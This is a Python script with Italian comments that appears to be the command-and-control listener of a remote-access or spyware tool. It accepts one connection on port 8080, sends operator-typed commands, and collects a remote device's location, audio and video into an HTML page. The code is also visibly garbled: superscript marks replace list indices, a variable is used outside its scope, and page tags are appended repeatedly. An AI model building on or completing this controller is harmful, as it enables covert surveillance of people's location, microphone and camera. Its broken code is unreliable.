import socket
from threading import Thread
import time

def send_data(sock):
    while True:
        command = input("Inserisci il comando: ")
        sock.send(command.encode())

def receive_data(sock):
    while True:
        data = sock.recv(1024).decode()
        print(data)
        if "position" in data:
            # Estrai la posizione dall'input
            position = data.split(':')¹.strip()
            # Aggiungi la posizione alla pagina HTML
            html += f"<p>Posizione: {position}</p>"
        elif "audio" in data:
            # Estrai l'audio dall'input
            audio_data = data.split(':')².strip()
            # Aggiungi l'audio alla pagina HTML
            html += f"<audio controls><source src='data:audio/wav;base64,{audio_data}' type='audio/wav'></audio>"
        elif "video" in data:
            # Estrai la camera dall'input
            video_data = data.split(':')³.strip()
            # Aggiungi la camera alla pagina HTML
            html += f"<video width='320' height='240' controls><source src='data:video/mp4;base64,{video_data}' type='video/mp4'></video>"

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 8080)) # Sostituisci l'indirizzo IP e il numero di porta con quelli desiderati
    server_socket.listen(1)

    print("Ascolto in corso...")
    client_socket, addr = server_socket.accept()
    print(f"Connesso a {addr}")

    send_thread = Thread(target=send_data, args=(client_socket,))
    receive_thread = Thread(target=receive_data, args=(client_socket,))

    send_thread.start()
    receive_thread.start()

    html = "<html><body>"
    while True:
        time.sleep(1) # Aggiorna la pagina ogni secondo
        print("Aggiornamento della pagina...")
        html += "</body></html>"  # Chiudi il body e l'html
        with open("page.html", "w") as file:
            file.write(html)
        print("Pagina aggiornata.")

if __name__ == "__main__":
    main()
